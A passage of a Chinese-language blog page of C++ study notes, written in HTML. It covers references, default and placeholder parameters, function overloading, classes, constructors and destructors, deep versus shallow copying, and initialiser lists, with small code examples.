class="hljs-comment">// [] 相当于告诉编译器这个将会释放一连串的空间地址</span><br></code></pre></td></tr></table></figure><h2 id="引用-————-给变量起别名">引用 ———— 给变量起别名</h2><p>本质：给变量取别名</p><p>语法：数据类型(与原数据类型相同) &amp;别名 = 原名</p><blockquote><p>相当于将<code>别名</code>的地址取成了<code>原名</code>的地址,进而通过改变对应的内存中的数据</p></blockquote><p>下面给出一个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">int</span> &amp;b = a;<span class="hljs-comment">// 使 a，b 两者的内存地址相同</span><br>b = <span class="hljs-number">20</span>;<br>cout &lt;&lt; a &lt;&lt; endl;<span class="hljs-comment">// a 变成了 20</span><br></code></pre></td></tr></table></figure><h3 id="相关注意事项">相关注意事项</h3><ol><li><p>引用必须要初始化</p><blockquote><p>需要告诉其为什么东西的别名，将其进行初始化</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">int <span class="hljs-meta">&amp;b; <span class="hljs-comment">// 错误的</span></span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>引用一旦初始化后就不可以更改了</p><blockquote><p>假设我们初始化 b 为 a 的别名后，不可以再将其进行改变为 c 的别名</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">int</span> &amp;b = a;<br><span class="hljs-keyword">int</span> c = <span class="hljs-number">20</span>;<br>b = c;<span class="hljs-comment">// 更改 a 的值，而不是更改引用</span><br>&amp;b = c; <span class="hljs-comment">// 多次引用会报错</span><br></code></pre></td></tr></table></figure></blockquote></li></ol><h3 id="引用做函数参数">引用做函数参数</h3><p>作用：函数传参的时候，可以利用引用让形参修饰实参</p><p>优点：可以简化指针修改实参</p><p>假设我们需要完成一个交换函数，我们除了利用<code>值传递</code>、<code>地址传递</code>、我们还可以使用<code>引用传递</code></p><p><strong>值传递</strong>:形参不会修饰实参</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span>&#123;<br><span class="hljs-keyword">int</span> c ;<br>c = a;<br>a = b;<br>b = c;<br>&#125;<br><span class="hljs-comment">// 通过这函数的时候我们将形参的值进行了改变，但是原数据呢？原数据却没有发生改变</span><br></code></pre></td></tr></table></figure><p><strong>地址传递</strong>:形参会修饰实参</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span>* a, <span class="hljs-keyword">int</span>* b)</span></span>&#123;<br><span class="hljs-keyword">int</span> c ;<br>c = *a;<br>*a = *b;<br>*b = c;<br>&#125;<br><span class="hljs-comment">// 我们通过找到对应的地址，修改对应地址里的值而将原来的数据进行了修改</span><br></code></pre></td></tr></table></figure><p><strong>引用传递</strong>:形参会修饰实参</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span>&amp; a, <span class="hljs-keyword">int</span>&amp; b)</span></span>&#123;<span class="hljs-comment">// 传入的是引用类型</span><br><span class="hljs-keyword">int</span> c ;<br>c = a;<br>a = b;<br>b = c;<br>&#125;<br><span class="hljs-comment">// 本质上还是我们通过找到对应的地址，修改对应地址里的值而将原来的数据进行了修改，使用引用可以简化对应的指针，相当于建立了另一个指针关系，其与地址的传递区别在于引用靠指针常量实现</span><br></code></pre></td></tr></table></figure><h3 id="引用做函数返回值类型">引用做函数返回值类型</h3><p><strong>注意</strong>：</p><ol><li>不要返回局部变量的引用</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span>&amp; <span class="hljs-title">t</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span> a = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">return</span> a;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span>&amp; ref = <span class="hljs-built_in">t</span>();<br>cout &lt;&lt; ref &lt;&lt;endl;<span class="hljs-comment">// 10</span><br>    <span class="hljs-comment">// 第一次会正确输出，因为编译器进行了一次的保存</span><br>cout &lt;&lt; ref &lt;&lt;endl;<span class="hljs-comment">// ?</span><br>    <span class="hljs-comment">// 第二次输出会发生错误</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>函数的调用可以作为左值(左值: 能用于赋值运算左边的表达式)</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span>&amp; <span class="hljs-title">t</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> a = <span class="hljs-number">10</span>; <span class="hljs-comment">// static 保存在全局区域，其数据会在程序结束后由OS进行释放</span><br><span class="hljs-keyword">return</span> a;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span>&amp; ref = <span class="hljs-built_in">t</span>();<br>cout &lt;&lt; ref &lt;&lt;endl;<span class="hljs-comment">// 10</span><br>cout &lt;&lt; ref &lt;&lt;endl;<span class="hljs-comment">// 10</span><br>    <br>    <span class="hljs-built_in">t</span>() = <span class="hljs-number">100</span>;<span class="hljs-comment">// 因为返回的是一个 a 的引用，这个函数的调用可以作为左值，相当于我们可以通过这个方式来对返回值进行修改</span><br>    cout &lt;&lt; ref &lt;&lt;endl;<span class="hljs-comment">// 100</span><br>cout &lt;&lt; ref &lt;&lt;endl;<span class="hljs-comment">// 100</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="引用本质">引用本质</h3><p>其在<code>C++</code>内部实现是一个指针常量( 算是一种懒人版指针? )</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">int</span>&amp; ref = a;    <span class="hljs-comment">// 会被编译器转化为  int* const ref = a ;</span><br>ref = <span class="hljs-number">20</span>;  <span class="hljs-comment">// 编译器发现 ref 为引用，会帮我们进行转换为  *ref = 20; </span><br></code></pre></td></tr></table></figure><h3 id="常量引用">常量引用</h3><p>作用：用来修饰形参，来防止误操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">int</span>&amp; ref = <span class="hljs-number">10</span>; <span class="hljs-comment">// 错误，引用必须引用到一块合法的内存空间</span><br><span class="hljs-comment">// -----</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span>&amp; ref = <span class="hljs-number">10</span>; <span class="hljs-comment">// 正确，加上 const 后，编译器将代码进行修改为 int temp = 10;const int&amp; ref = temp;</span><br><span class="hljs-comment">// 加上 const 后变为只读不可以修改</span><br>ref = <span class="hljs-number">20</span>;  <span class="hljs-comment">// 错误</span><br></code></pre></td></tr></table></figure><h2 id="函数提高">函数提高</h2><h3 id="函数默认参数">函数默认参数</h3><p><code>C++</code>中，函数的形参列表中的形参是可以有默认值的</p><p>语法：<code>返回值类型 函数名(形参 = 默认参数)</code></p><p>正常情况下我们计算一个三个数相加时，需要将三个参数均传入</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b,<span class="hljs-keyword">int</span> c)</span></span>&#123;<br><span class="hljs-keyword">return</span> a+b+c;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">func</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<span class="hljs-comment">// 1 + 2 + 3</span><br>&#125;<br></code></pre></td></tr></table></figure><p>但是如果我们设定了默认值我们可以只传入一部分参数，其他数据使用默认值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b = <span class="hljs-number">10</span>,<span class="hljs-keyword">int</span> c = <span class="hljs-number">30</span>)</span></span>&#123;    <br><span class="hljs-keyword">return</span> a+b+c;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">func</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);  <span class="hljs-comment">// 1 + 2 + 30 </span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>注意事项</strong>:</p><ol><li><p>当一个形参设置的默认参数时，其后面的形参都需要设置对应的默认参数</p></li><li><p>如果函数的声明有默认参数，函数实现就不能有默认参数</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a = <span class="hljs-number">10</span>,<span class="hljs-keyword">int</span> b = <span class="hljs-number">10</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a = <span class="hljs-number">20</span> ,<span class="hljs-keyword">int</span> b = <span class="hljs-number">20</span>)</span></span>&#123;<span class="hljs-comment">// 默认参数重定义了，会发生报错</span><br><span class="hljs-keyword">return</span> a + b;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="函数占位参数">函数占位参数</h3><p>语法：<code>返回值类型 函数名 (数据类型)&#123;&#125;</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Func</span><span class="hljs-params">( <span class="hljs-keyword">int</span> a ,<span class="hljs-keyword">int</span> )</span></span>&#123;<br><span class="hljs-comment">//XXX</span><br>&#125;<br></code></pre></td></tr></table></figure><p>其中占位参数可以拥有默认参数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Func</span><span class="hljs-params">( <span class="hljs-keyword">int</span> a ,<span class="hljs-keyword">int</span> = <span class="hljs-number">10</span>)</span></span>&#123;<br><span class="hljs-comment">//XXX</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="函数重载">函数重载</h3><p>作用：函数名可以相同，提高复用性</p><p>函数重载满足条件：</p><ul><li>同一个作用域下</li><li>函数名相同</li><li>函数参数类型不同或者个数不同或者顺序不同</li></ul><p>注意：函数的返回值不可以作为函数重载的条件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-comment">//XXX</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span>&#123;<br><span class="hljs-comment">//XXX</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">func</span>();<span class="hljs-comment">// 调用第一个func()</span><br><span class="hljs-built_in">func</span>(<span class="hljs-number">10</span>);<span class="hljs-comment">// 调用第二个func()</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>注意事项</strong>:</p><ul><li><p>引用作为重载条件</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span>&amp; a)</span></span>&#123;<br><span class="hljs-comment">//XXX</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span>&amp; a)</span></span>&#123;<span class="hljs-comment">// const 限制了只读的特点</span><br><span class="hljs-comment">//XXX</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span> a = <span class="hljs-number">10</span>; <br><span class="hljs-built_in">func</span>(a);<span class="hljs-comment">// 调用第一个func()</span><br><span class="hljs-built_in">func</span>(<span class="hljs-number">10</span>);<span class="hljs-comment">// 调用第二个func()，编译器会产生一个中间变量保存10，之后调用函数</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>函数重载遇到默认参数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span>&#123;<br><span class="hljs-comment">//XXX</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a，<span class="hljs-keyword">int</span> b = <span class="hljs-number">10</span>)</span></span>&#123;<br><span class="hljs-comment">//XXX</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">func</span>(<span class="hljs-number">10</span>);<span class="hljs-comment">// 发生错误，两个函数均可以调用，产生了二义性</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="类和对象">类和对象</h2><p><code>C++</code>面向对象的三大特性为：封装、继承、多态</p><h3 id="封装">封装</h3><p>意义:</p><ul><li><p>将属性和行为作为一个整体，表现生活中的事物</p></li><li><p>将属性和行为加以权限控制</p></li></ul><p>语法:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> 类名&#123;</span><br><span class="hljs-comment">//访问权限</span><br><span class="hljs-comment">//public: //公共权限 类内可以访问 类外可以访问</span><br>    <span class="hljs-comment">//protected: //保护权限 类内可以访问 类外不可以访问</span><br>    <span class="hljs-comment">//private: //私有权限 类内可以访问 类外不可以访问</span><br>    <span class="hljs-comment">//属性 </span><br>    <span class="hljs-comment">// XXX</span><br>    <span class="hljs-comment">//行为 (通常为函数)</span><br>    <span class="hljs-comment">// XXX</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>如定义一个圆类：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PI 3.1415</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cir</span>&#123;</span><br><span class="hljs-keyword">public</span>:<span class="hljs-comment">//访问权限：公共权限</span><br><span class="hljs-keyword">int</span> m_r;<span class="hljs-comment">//属性 </span><br><span class="hljs-function"><span class="hljs-keyword">double</span> <span class="hljs-title">calculate</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-comment">//行为</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * PI * m_r;<br>&#125;<br>  &#125;;<br>  <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cir c1;    <span class="hljs-comment">// 通过类创建一个对象，来进行实例化</span><br>    c1.m_r = <span class="hljs-number">10</span>;<br>    cout &lt;&lt; c1.<span class="hljs-built_in">calculate</span>() &lt;&lt; endl;    <span class="hljs-comment">// 输出计算的计算周长</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>class</code>与<code>struct</code>的唯一的区别就在于默认访问权限，<code>class</code>在不注明对应的权限时，默认为<strong>私有</strong>，<code>struct</code>默认权限为<strong>公共</strong></p><h3 id="对象的初始化与清理">对象的初始化与清理</h3><p><code>C++</code>利用<code>构造函数</code>和<code>析构函数</code>解决对象的初始化和清理，这两个函数将会被编译器自动调用，完成对象的初始化和清理工作，如果我们不提供构造和析构函数，编译器会提供，但是其提供的构造和析构函数是空实现。</p><ul><li>构造函数：主要用于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用，无需手动调用</li><li>析构函数：主要用于对象销毁前系统自动调用，执行一些清理工作。</li></ul><p><strong>构造函数语法:</strong> <code>类名()&#123;&#125;</code></p><ol><li>构造函数，没有返回值也不写void</li><li>函数名称与类名相同</li><li>构造函数可以有参数，因此可以发生重载</li><li>程序在调用对象时候会自动调用构造函数，无须手动调用,而且只会调用一次</li></ol><p><strong>析构函数语法：</strong><code>~类名()&#123;&#125;</code></p><ol><li>析构函数，没有返回值也不写void</li><li>函数名称与类名相同,在名称前加上符号<code>~</code></li><li>析构函数不可以有参数，因此不可以发生重载</li><li>程序在对象销毁前会自动调用析构，无须手动调用,而且只会调用一次</li></ol><h4 id="构造函数的分类及调用">构造函数的分类及调用</h4><p><strong>两种分类方式</strong></p><p>按参数分为： 有参构造和无参构造</p><p>按类型分为： 普通构造和拷贝构造</p><p><strong>三种调用方式</strong>：括号法、显示法、隐式转换法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//1、构造函数分类</span><br><span class="hljs-comment">// 按照参数分类分为 有参和无参构造   无参又称为默认构造函数</span><br><span class="hljs-comment">// 按照类型分类分为 普通构造和拷贝构造</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//无参（默认）构造函数</span><br><span class="hljs-built_in">Person</span>() &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;无参构造函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//有参构造函数</span><br><span class="hljs-built_in">Person</span>(<span class="hljs-keyword">int</span> a) &#123;<br>age = a;<br>cout &lt;&lt; <span class="hljs-string">&quot;有参构造函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//拷贝构造函数</span><br><span class="hljs-built_in">Person</span>(<span class="hljs-keyword">const</span> Person &amp;p) &#123;<br>        <span class="hljs-comment">// 将传入的人身上的所有属性，拷贝到我身上</span><br>age = p.age;<br>cout &lt;&lt; <span class="hljs-string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//析构函数</span><br>~<span class="hljs-built_in">Person</span>() &#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;析构函数!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-keyword">int</span> age;<br>&#125;;<br><br><span class="hljs-comment">//2、构造函数的调用</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span> </span>&#123;<br>Person p1; <span class="hljs-comment">//调用无参构造函数</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test02</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-comment">//2.1  括号法，常用</span><br><span class="hljs-function">Person <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>; <span class="hljs-comment">//调用有参构造函数 </span><br>    <span class="hljs-function">Person <span class="hljs-title">p3</span><span class="hljs-params">(p2)</span></span>; <span class="hljs-comment">//调用拷贝构造函数 </span><br><span class="hljs-comment">//注意1：调用无参构造函数不能加括号，如果加了编译器认为这是一个函数声明</span><br><span class="hljs-comment">//Person p2();// 错误</span><br><br><span class="hljs-comment">//2.2 显式法，将后面的匿名对象保存到左边的对象处</span><br>Person p2 = <span class="hljs-built_in">Person</span>(<span class="hljs-number">10</span>); <br>Person p3 = <span class="hljs-built_in">Person</span>(p2);<br><span class="hljs-comment">//Person(10); 单独写就是匿名对象，当前行结束之后，将会马上析构</span><br>    <br>    <span class="hljs-comment">//注意2:不能利用拷贝构造函数初始化匿名对象，编译器认为是对象声明</span><br><span class="hljs-comment">//Person (p3);// 错误</span><br>    <br><span class="hljs-comment">//2.3 隐式转换法</span><br>Person p4 = <span class="hljs-number">10</span>; <span class="hljs-comment">// Person p4 = Person(10); </span><br>Person p5 = p4; <span class="hljs-comment">// Person p5 = Person(p4); </span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">test01</span>();<br><span class="hljs-built_in">test02</span>();<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="深拷贝与浅拷贝">深拷贝与浅拷贝</h4><p>浅拷贝 -&gt; 简单的赋值拷贝操作</p><p>深拷贝 -&gt; 在堆区重新开辟空间，进行拷贝操作</p><p>浅拷贝带来的问题是堆区内存的重复释放，对此问题我们采用深拷贝来进行解决</p><blockquote><p>如果属性有在堆区开辟的，一定要自己提供一个构造函数，防止浅拷贝带来的问题</p></blockquote><p>举个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Person</span>()&#123;<br><span class="hljs-comment">//XXX</span><br>    &#125;<br>    <span class="hljs-built_in">Person</span>(Person &amp;p)&#123; <span class="hljs-comment">// 我们自己创建的一个拷贝构造函数</span><br>a = p.a;<br>        b = <span class="hljs-keyword">new</span> <span class="hljs-built_in"><span class="hljs-keyword">int</span></span>(*p.b);<br>    &#125;<br>    ~<span class="hljs-built_in">Person</span>()&#123;<br><span class="hljs-keyword">if</span>(b != <span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-keyword">delete</span> b;<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">int</span> a;<br>    <span class="hljs-keyword">int</span>* b; <span class="hljs-comment">//此时我们创建了一个堆上变量，需要我们自己写一个拷贝构造函数</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>上面例子中因为<code>b</code>是一个指针，指向一个地址空间,如果我们简单的将对应的堆上地址进行复制过去时便会产生在析构函数中多次进行释放的一个问题，从而导致问题</p><h4 id="初始化列表">初始化列表</h4><p>语法： <code>构造函数(): 属性1(值1)、属性2(值2)...</code></p><p>我们传统的初始化过程像下面代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">class <span class="hljs-title">Person</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">Person</span>(<span class="hljs-keyword">int</span> a,<span class="hljs-keyword">int</span> b,<span class="hljs-keyword">int</span> c)&#123;<br>ma = a;<br>        mb = b;<br>    mc = c;<br>    &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">int</span> ma,mb,mc;<br>&#125;;<br></code></pre></td></tr></table></figure><p>利用<code>C++</code>的一个特性我们可以将其进行修改为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">class <span class="hljs-title">Person</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">Person</span>(<span class="hljs-keyword">int</span> a,<span 